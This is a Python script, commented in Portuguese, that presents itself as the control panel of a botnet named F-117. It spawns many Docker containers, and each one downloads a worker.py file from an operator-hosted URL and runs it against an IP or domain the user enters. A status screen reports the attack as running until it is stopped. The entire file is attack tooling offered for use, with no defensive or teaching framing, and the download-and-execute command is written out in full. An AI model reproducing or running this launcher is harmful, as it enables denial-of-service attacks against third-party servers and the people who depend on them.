import docker
import time
import os

client = docker.from_env()

def start_botnet(target, num_containers):
    # URL onde o worker.py está hospedado (vou rodar somente no linux, ent o ip vai ser 10.x.x.x)
    WORKER_URL = "http://seu-ip:8000/worker.py" 
    
    # Comando que o container executará ao iniciar:
    # 1. Atualiza o sistema e instala python3 e curl
    # 2. Baixa o worker.py
    # 3. Executa o worker.py passando o alvo
    cmd = f"sh -c 'apt-get update && apt-get install -y python3 curl && curl -s {WORKER_URL} -o /tmp/worker.py && python3 /tmp/worker.py {target}'"

    containers = []
    print(f"[*] Iniciando {num_containers} nós de ataque contra {target}...")

    for i in range(num_containers):
        try:
            container = client.containers.run(
                "ubuntu:latest", 
                command=cmd, 
                detach=True, 
                name=f"f117_node_{i}"
            )
            containers.append(container)
            print(f"[+] Nó {i} ativo.")
        except Exception as e:
            print(f"[!] Erro ao subir nó {i}: {e}")

    return containers

def monitor_panel(containers):
    try:
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            active_nodes = 0
            for c in containers:
                c.reload()
                if c.status == 'running':
                    active_nodes += 1
            
            print("========================================")
            print("   F-117 BOTNET CONTROL PANEL")
            print("========================================")
            print(f"Nós Ativos: {active_nodes} / {len(containers)}")
            print(f"Status: ATACANDO")
            print("========================================")
            print("Pressione Ctrl+C para parar o ataque")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Parando botnet...")

def stop_botnet(containers):
    for c in containers:
        try:
            c.stop()
            c.remove()
        except:
            pass
    print("[*] Todos os nós foram removidos.")

if __name__ == "__main__":
    target_input = input("Digite o IP ou Domínio do alvo: ")
    nodes_input = int(input("Quantidade de containers (nós): "))

    bot_list = start_botnet(target_input, nodes_input)
    monitor_panel(bot_list)
    stop_botnet(bot_list)
